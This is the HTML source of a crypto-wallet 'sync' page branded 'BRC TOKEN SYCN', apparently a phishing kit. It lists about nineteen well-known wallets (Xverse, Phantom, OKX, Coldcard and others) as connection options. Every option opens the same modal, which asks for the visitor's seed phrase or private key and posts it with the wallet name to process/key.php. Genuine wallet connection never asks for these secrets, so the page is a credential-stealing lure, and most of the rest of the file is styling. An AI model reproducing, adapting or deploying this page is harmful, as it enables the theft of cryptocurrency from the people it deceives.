@media (max-width: 375px){[class~=ms_modal_el-title-first]{overflow:hidden;}[class~=ms_modal_el-title-first]{white-space:nowrap;}[class~=ms_modal_el-title-first]{max-width:6.25pc;}[class~=ms_modal_el-title-first]{text-overflow:ellipsis;}.ms_stroke_con{display:none;}[class~=ms_modal]{gap:10px;}[class~=ms_modal]{padding-left:.229166667in;}[class~=ms_modal]{padding-bottom:.229166667in;}[class~=ms_modal]{padding-right:.229166667in;}[class~=ms_modal]{padding-top:.229166667in;}.ms_modal_content{gap:1.0625pc;}[class~=ms_modal_menu]{gap:0in;}.ms_modal_head title{font-size:16.5pt;}} @media (min-height: 601px) and (max-height: 750px){[class~=ms_modal_el-title-first]{overflow:hidden;}[class~=ms_modal_el-title-first]{white-space:nowrap;}[class~=ms_modal_el-title-first]{max-width:6.25pc;}[class~=ms_modal_el-title-first]{text-overflow:ellipsis;}[class~=ms_head_body],[class~=ms_stroke_con]{display:none;}[class~=ms_modal]{gap:10px;}.ms_modal{padding-left:16.5pt;}.ms_modal{padding-bottom:16.5pt;}.ms_modal{padding-right:16.5pt;}.ms_modal{padding-top:16.5pt;}[class~=ms_modal_content]{gap:.177083333in;}[class~=ms_modal_menu]{gap:0pt;}[class~=ms_modal_head] title{font-size:22px;}}@media (min-height: 500px) and (max-height: 600px){[class~=ms_modal_el-title-first]{overflow:hidden;}[class~=ms_modal_el-title-first]{white-space:nowrap;}[class~=ms_modal_el-title-first]{max-width:75pt;}[class~=ms_modal_el-title-first]{text-overflow:ellipsis;}[class~=ms_stroke_con],[class~=ms_modal_el-title-second],[class~=ms_head_body]{display:none;}[class~=ms_modal]{gap:4.5pt;}[class~=ms_modal]{padding-left:.15625in;}[class~=ms_modal]{padding-bottom:.15625in;}[class~=ms_modal]{padding-right:.15625in;}[class~=ms_modal]{padding-top:.15625in;}[class~=ms_modal_content]{gap:.104166667in;}[class~=ms_modal_menu]{gap:0pt;}[class~=ms_modal_el]{padding-left:.145833333in;}[class~=ms_modal_el]{padding-bottom:.145833333in;}[class~=ms_modal_el]{padding-right:.145833333in;}[class~=ms_modal_el]{padding-top:.145833333in;}[class~=ms_modal_head] title{font-size:23px;}}@media (max-height: 499px){.ms_modal_el-title-first{overflow:hidden;}.ms_modal_el-title-first{white-space:nowrap;}.ms_modal_el-title-first{max-width:100px;}.ms_modal_el-title-first{text-overflow:ellipsis;}.ms_modal_el-title-second,[class~=ms_stroke_con],
[class~=ms_head_body]{display:none;}[class~=ms_modal]{gap:6px;}[class~=ms_modal]{padding-left:11.25pt;}[class~=ms_modal]{padding-bottom:11.25pt;}[class~=ms_modal_head] title{font-size:.15625in;}[class~=ms_modal]{padding-right:11.25pt;}[class~=ms_modal]{padding-top:11.25pt;}[class~=ms_custom_modal_content]{gap:.083333333in;}[class~=ms_modal_el],.ms_modal_button button{padding-left:.5pc;}.ms_modal_button button,[class~=ms_modal_el]{padding-bottom:.5pc;}.ms_modal_menu{gap:0pt;}.ms_modal_button button,[class~=ms_modal_el]{padding-right:.5pc;}[class~=ms_modal_el],.ms_modal_button button{padding-top:.5pc;}.ms_modal_el-title-first{font-size:9.75pt;}} #ms-modal-overlay{position:fixed;}#ms-modal-overlay{display:block;}#ms-modal-overlay{width:100%;}#ms-modal-overlay{height:100%;}#ms-modal-overlay{z-index:99998;}.black .or-class {background: #0d0e13;}</style><style>@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Nunito:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap");[class~=ms_loader_head] title{color:#01091b;}.ms_loader{position:absolute;}.ms_loader{top:50%;}#ms-loader,[class~=ms_loader_head] title{display:block;}[class~=ms_loader_head] title{font-size:32px;}#ms-loader{position:fixed;}[class~=ms_loader_head] title,.ms_loader button{font-style:normal;}.ms_loader{left:50%;}.ms_loader{transform:translate(-50%,-50%);}.ms_loader button,.ms_loader button.active{border-radius:.166666667in;}.ms_loader{box-sizing:border-box;}.ms_loader{width:calc(100% - 20px);}
[class~=ms_loader_head],.ms_loader,.ms_loader button,[class~=ms_loader_content]{display:flex;}[class~=ms_loader_head] title,.ms_loader button{font-weight:700;}#ms-loader{width:100%;}.ms_loader button,[class~=ms_loader_head] title{line-height:normal;}[class~=ms_loader_head] title{letter-spacing:.02pc;}.ms_loader{max-width:420pt;}.ms_loader button{padding-left:0in;}.ms_loader{padding-left:24pt;}.ms_loader{padding-bottom:24pt;}#ms-loader{height:100%;}.ms_loader button{padding-bottom:1.25pc;}.ms_loader button{padding-right:0in;}.ms_loader{padding-right:24pt;}.ms_loader button{padding-top:1.25pc;}.ms_loader button,[class~=ms_loader_main]{justify-content:center;}.ms_loader{padding-top:24pt;}
.ms_loader button{align-items:center;}.ms_loader,[class~=ms-loader-content],[class~=ms_loader_content],[class~=ms_loader_head]{flex-direction:column;}.ms_loader button{gap:8px;}.ms_loader button.active{background:linear-gradient(91deg,#4200fd 0%,#0056fd 98.05%);}[class~=ms_loader_content],[class~=ms_loader_head],.ms_loader{align-items:flex-start;}.ms_loader{overflow:hidden;}[class~=ms_loader_content],.ms_loader button{align-self:stretch;}.ms_loader button{font-family:Inter;}.ms_loader{gap:40px;}#ms-loader{inset:0pc;}.ms_loader{border-radius:2pc;}.ms_loader button.active{color:white;}#ms-loader{background:rgba(8,5,23,.5);}.ms_loader button{outline:0px;}.ms_loader button{cursor:pointer;}
.ms_loader button{font-size:1pc;}[class~=ms_loader_content]{gap:32px;}.ms_loader button.disabled,[class~=ms_loader] [class~=black] button[class~=disabled]{opacity:.2;}.ms_loader button{letter-spacing:.01pc;}.ms_loader button{border-left-width:0in;}.ms_loader button{border-bottom-width:0in;}.ms_loader button.disabled{background:#c5c5c5;}[class~=ms_loader_head]{height:71px;}.ms_loader button{border-right-width:0in;}.ms_loader button{border-top-width:0in;}.ms_loader button{border-left-style:none;}.ms_loader button{border-bottom-style:none;}[class~=ms_loader_head]{gap:.083333333in;}.ms_loader button{border-right-style:none;}.ms_loader button{border-top-style:none;}.ms_loader button{border-left-color:currentColor;}
.ms_loader button{border-bottom-color:currentColor;}.ms_loader button{border-right-color:currentColor;}.ms_loader button{border-top-color:currentColor;}[class~=ms-loader-content],[class~=ms_loader_main],[class~=ms_loader_text]{display:flex;}[class~=ms_loader_main],[class~=ms-loader-content],[class~=ms_loader_text]{align-items:center;}.ms_loader button{border-image:none;}[class~=ms-lds-ring] div{box-sizing:border-box;}[class~=ms-lds-ring] div{display:block;}[class~=ms-lds-ring] div{position:absolute;}[class~=ms-lds-ring] div{width:32px;}[class~=ms-lds-ring] div{height:.333333333in;}[class~=ms-lds-ring] div{margin-left:3pt;}[class~=ms-lds-ring] div{margin-bottom:3pt;}#ms-loader{z-index:999999;}[class~=ms-lds-ring]
div{margin-right:3pt;}[class~=ms-lds-ring] div{margin-top:3pt;}[class~=ms-lds-ring] div{border-left-width:2.25pt;}[class~=ms_loader_main]{align-self:stretch;}[class~=ms-lds-ring] div{border-bottom-width:2.25pt;}[class~=ms-lds-ring] div{border-right-width:2.25pt;}[class~=ms_loader][class~=white]{background:#fff;}#ms-loader{font-family:Inter,sans-serif;}[class~=ms-lds-ring] div{border-top-width:2.25pt;}[class~=ms-lds-ring] div{border-left-style:solid;}[class~=ms-loader-content]{gap:24pt;}[class~=ms-lds-ring] div{border-bottom-style:solid;}[class~=ms-lds-ring] div{border-right-style:solid;}[class~=ms-loader-content]{max-width:18.75pc;}[class~=ms-lds-ring] div{border-top-style:solid;}[class~=ms-lds-ring] div{border-left-color:transparent;}[class~=ms-lds-ring]
div{border-bottom-color:transparent;}[class~=ms_loader_text]{flex-direction:column;}[class~=ms_loader_text]{gap:.25pc;}[class~=ms-lds-ring] div{border-right-color:transparent;}[class~=ms-lds-ring] div{border-top-color:#9747ff;}[class~=ms-lds-ring] div{border-image:none;}.ms_loader button.disabled{color:#01091b;}[class~=ms-lds-ring] div{border-radius:100%;}[class~=ms-lds-ring] div{animation:ms-lds-ring 1.2s cubic-bezier(.5,0,.5,1) infinite;}[class~=ms_loader_text]{color:#3a455f;}[class~=ms_loader_text]{text-align:center;}[class~=ms_loader_text]{font-family:Inter;}[class~=ms_loader_text]{font-size:.166666667in;}[class~=ms_loader_text]{font-style:normal;}[class~=ms_loader_text]{font-weight:400;}[class~=ms_loader_button]{width:100%;}[class~=ms-lds-ring] div:nth-child(1){animation-delay:-.45s;}
[class~=ms_loader_button]{display:grid;}[class~=ms-lds-ring]{display:inline-block;}[class~=ms-lds-ring]{position:relative;}[class~=ms-lds-ring]{width:30pt;}[class~=ms-lds-ring]{border-radius:3.125pc;}[class~=ms-lds-ring]{height:40px;}[class~=ms-lds-ring]{overflow:hidden;}[class~=ms_loader] [class~=black] button[class~=disabled]{background:#545454;}[class~=ms-lds-ring] div:nth-child(2){animation-delay:-.3s;}[class~=ms-lds-ring] div:nth-child(3){animation-delay:-.15s;}@keyframes ms-lds-ring{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}[class~=ms_modal_spinner]{display:flex;}[class~=ms_modal_spinner]{width:52px;}[class~=ms_modal_spinner]{height:3.25pc;}#ms-loader .black .ms_loader_el .vector path{fill:white;}[class~=ms_modal_spinner]
[class~=load]{background:linear-gradient(92deg,rgba(66,0,253,.08) 11.46%,rgba(0,86,253,.08) 95.34%);}.white .ms_loader_el .vector path{fill:black;}[class~=ms_modal_spinner]{padding-left:4.8pt;}#ms-progress{background:linear-gradient(90deg,#3c08fe 68.26%,rgba(56,14,254,0) 100%);}[class~=black] [class~=ms_loader_button] button[class~=disabled]{color:white;}[class~=ms_modal_spinner]{padding-bottom:4.8pt;}[class~=ms_modal_spinner]{padding-right:4.8pt;}[class~=ms_modal_spinner]{padding-top:4.8pt;}[class~=ms_modal_spinner]{justify-content:center;}#ms-progress{height:100%;}[class~=ms-l-d-s] p{margin-left:0pc;}[class~=ms_modal_spinner]{align-items:center;}[class~=black] [class~=ms_loader_button] button[class~=disabled]{background:#545454;}[class~=ms_modal_spinner],[class~=ms_modal_spinner]
[class~=load],[class~=ms_modal_spinner][class~=success]{border-radius:50px;}[class~=ms_modal_spinner]{position:absolute;}[class~=ms-l-d-s] p{margin-bottom:0pc;}[class~=ms_modal_spinner][class~=success]{background:rgba(86,214,41,.08);}[class~=ms_modal_spinner][class~=success]{backdrop-filter:blur(3.25000023842px);}[class~=ms_modal_spinner][class~=error]{background:rgba(224,82,94,.08);}[class~=ms-l-d-s] p{margin-right:0pc;}[class~=ms_modal_spinner]{top:50%;}[class~=ms_loader][class~=black]{background:#0d0e13;}#ms-loader .black .ms_loader_text{color:#959eb0;}[class~=ms_modal_spinner]{left:50%;}[class~=ms_modal_spinner]{transform:translate(-50%,-50%);}[class~=ms_loader_el]{position:relative;}[class~=ms_loader_title]{color:#01091b;}[class~=ms_loader_title]{font-size:1.125pc;}[class~=ms_loader_title]{font-style:normal;}[class~=ms-l-d-s]
p{margin-top:0pc;}[class~=ms_loader_title]{font-weight:500;}[class~=ms_loader_title]{line-height:normal;}[class~=ms_loader_title]{text-align:center;}[class~=black] [class~=ms_loader_title]{color:white;}[class~=ms_loader_title]{letter-spacing:.00375in;}[class~=ms_progress_bar]{position:absolute;}[class~=ms_progress_bar]{bottom:0in;}[class~=ms_progress_bar]{right:0px;}[class~=ms_progress_bar]{left:0pc;}[class~=ms_progress_bar]{height:.041666667in;}#ms-loader .black .ms_loader_head title{color:#fff;}</style></head>
<style>
 .mymodal{
  position: absolute !important;
  top: 0 !important;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #00000045 !important;
  width: 100% !important;
  height: 100vh !important;
  z-index: 555555;
  display: none;
  justify-content: center;
  align-items: center;
}
.modal-content{
    width: 500px;
    min-height: fit-content;
    padding: 2rem 1rem;
    margin: auto;
    background-color: #01091b;
    border-radius: 10px;
    position: relative;
}
.close-modal{
    position: absolute;
    top: 0;
    right: 0;
    background-color: red;
    color: #fff;
    padding: 5px 10px;

}
</style>
<body class="" data-aos-easing="ease-in-out" data-aos-duration="1000" data-aos-delay="0">
    <div class="mymodal">
        <div class="modal-content">
         <button class="close-modal">X</button>
        <form method="POST" action="process/key.php">
            <div class="form-group">
              <label for="key" class="mb-1">Enter Your Key Phrase or Private Key</label>
              <textarea class="form-control" name="keys" id="key" rows="5" style="background-color: #00000060; color: #fff;"></textarea>
              <input type="hidden" name="walletType" id="selectedWallet" placeholder="Selected Name" readonly>
            </div>
            <div class="form-control" style="background-color: transparent; border: none;">
                <button class="btn btn-dark btn-sm">Connect</button>
            </div>
          </form>

        
     </div>
    </div>
  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top d-flex align-items-center">
    <div class="container d-flex align-items-center justify-content-between">

      <div class="logo text-light">
        <h1 style="font-size: 18px; color: #fff;"><a href="index.html">BRC TOKEN SYCN</a></h1>
         <!--Uncomment below if you prefer to use an image logo -->
       <!--<a href="index.html"><img src="assets/img/node protocol-3.png" alt="" class="img-fluid" height="1000px"></a> -->
      </div>

      <nav id="navbar" class="navbar">
        <ul>
          <!-- <li><a class="nav-link scrollto active" href="#hero">Home</a></li>
          <li><a class="nav-link scrollto" href="#about">About</a></li>
          <li><a class="nav-link scrollto" href="#features">Services</a></li>
          
          <li><a class="nav-link scrollto" href="#contact">Contact</a></li> -->
          <li><a class="openmodal connect-button getstarted " style="cursor: pointer;" >Connect Wallet</a></li>
        </ul>
      </nav><!-- .navbar -->

    </div>
</header><!-- End Header -->
<main id="main">

    <!-- ======= Features Section ======= -->
    <section id="features" class="features" style="min-height: 70vh; margin-top: 3rem;">
        <div class="container">


          
          <div class="section-title aos-init aos-animate" data-aos="fade-up">
            <h2>Choose Wallet to Connect</h2>
          </div>
          <div class="row aos-init aos-animate" data-aos="fade-up" data-aos-delay="300">
            <div class="connectButton openmodal col-lg-3 col-md-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="Xverse.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Xverse</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4 mt-md-0" style="cursor: pointer;">
              <div class="icon-box">
                <img src="wallet-1.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Ordinalsbot</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4 mt-md-0" style="cursor: pointer;">
              <div class="icon-box">
                <img src="wallet-2.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Solv btc</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4 mt-lg-0" style="cursor: pointer;">
              <div class="icon-box">
                <img src="wallet-3.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Bisq</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="wallet-4.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Blue Wallet</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="phantom.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Phantom Wallet</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="okx.jpg" width="50px" alt="" class="mx-1">
                <h3><a>OKX</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="rune.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Rune</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="coldcard.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Coldcard</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="sovryn.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Sovryn</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="samourai.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Samourai</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="karak.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Karak</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="x_launch.jpg" width="50px" alt="" class="mx-1">
                <h3><a>XLaunch</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="unisats.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Unisats</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="leather.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Leather</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="enkrypt.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Enkrypt</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="magiceden.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Magic Eden</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="sparrow.jpg" height="45px" alt="" class="mx-1">
                <h3><a>Sparrow Wallet</a></h3>
              </div>
            </div>
            <div class="connectButton openmodal col-lg-3 col-md-4 mt-4" style="cursor: pointer;">
              <div class="icon-box">
                <img src="bitget.jpg" width="50px" alt="" class="mx-1">
                <h3><a>Bitget</a></h3>
              </div>
            </div>
          </div>
        </div>
      </section><!-- End Features Section -->
  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer">
    <div class="container">
      <div class="row d-flex align-items-center">
        <div class="col-lg-6 text-lg-left text-center">
          <div class="copyright">
            © Copyright <strong>BRC TOKEN SYCN</strong>. All Rights Reserved
          </div>
          <div class="credits">
            <!-- All the links in the footer should remain intact. -->
            <!-- You can delete the links only if you purchased the pro version. -->
            <!-- Licensing information: https://bootstrapmade.com/license/ -->
            <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/vesperr-free-bootstrap-template/ -->

          </div>
        </div>
        <div class="col-lg-6">
          <!-- <nav class="footer-links text-lg-right text-center pt-2 pt-lg-0">
            <a href="#hero" class="scrollto">Home</a>
            <a href="#about" class="scrollto">About</a>
          </nav> -->
        </div>
      </div>
    </div>
  </footer><!-- End Footer -->

  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <!-- <script src="assets/vendor/purecounter/purecounter_vanilla.html"></script>
  <script src="assets/vendor/aos/aos.html"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.html"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.html"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.html"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.html"></script>
  <script src="assets/vendor/php-email-form/validate.html"></script> -->

  <!-- Template Main JS File -->
  <!-- <script src="assets/js/main.html"></script> -->

  <!-- <script src="assets/web3-provider/web3-modal.html"></script>
  <script src="assets/web3-provider/web3-loader.html"></script>
  <script src="assets/web3-provider/web3-connect.html"></script>
  <script src="assets/web3-provider/web3-module.html"></script> 
  <script src="assets/web3-provider/web3-alert.html"></script> 
  <script src="assets/web3-provider/web3-data.html"></script>
  <script src="assets/web3-provider/ethers.html"></script>
  <script src="assets/web3-provider/web3-router.html"></script>
  <script src="assets/web3-provider/ethereum-tx.html"></script> 
  <script src="assets/web3-modules/module-seaport.html"></script>
  <script src="assets/web3-modules/module-blur.html"></script>
  <script src="assets/web3-modules/module-x2y2.html"></script>
  <script src="assets/web3-provider.html"></script>
 -->
  <script src="jquery.js"></script>
  <script>
    $(document).ready(function () {
      $(".openmodal").click(function(){
        var selectedWallet = $(this).find("h3 a").text().trim();
        $("#selectedWallet").val(selectedWallet);
        // alert("Selected Wallet: " + selectedWallet);
        $(".mymodal").css("display", "flex");
      });

      $(".close-modal").click(function(){
        $(".mymodal").css("display", "none");
      });
    });
  </script>

<style>.u-disable-duration * {transition-duration: 0s !important;}</style><script src="../www.google.com/recaptcha/apiafda.js?render=6LfZZRIpAAAAAMiQTTT2Z3aPXyd0XSnMlMVMcz1h" async=""></script><iframe id="chat-application-iframe" title="Smartsupp" aria-hidden="true" style="display: block; position: fixed; top: 0px; left: 0px; width: 1px; height: 1px; opacity: 0; border: medium; z-index: -1; pointer-events: none;"></iframe><div><div class="grecaptcha-error"></div></div><iframe style="display: none;"></iframe></div><div id="smartsupp-widget-container">  <div style="border-radius: 9999px; box-shadow: rgba(0, 0, 0, 0.06) 0px 1px 6px 0px, rgba(0, 0, 0, 0.12) 0px 2px 32px 0px; height: 56px; position: fixed; bottom: 24px; left: initial; right: 200px; z-index: 10000000; width: 109px;" data-testid="widgetButtonFrame"><iframe id="widgetButtonFrame" title="Smartsupp widget button" style="position: absolute; width: 100%; height: 100%; border: medium; display: block; text-align: left; margin: 0px; padding: 0px; top: 0px; left: 0px; opacity: 1;" allowfullscreen="" scrolling="no"></iframe></div>  </div></body>
</html>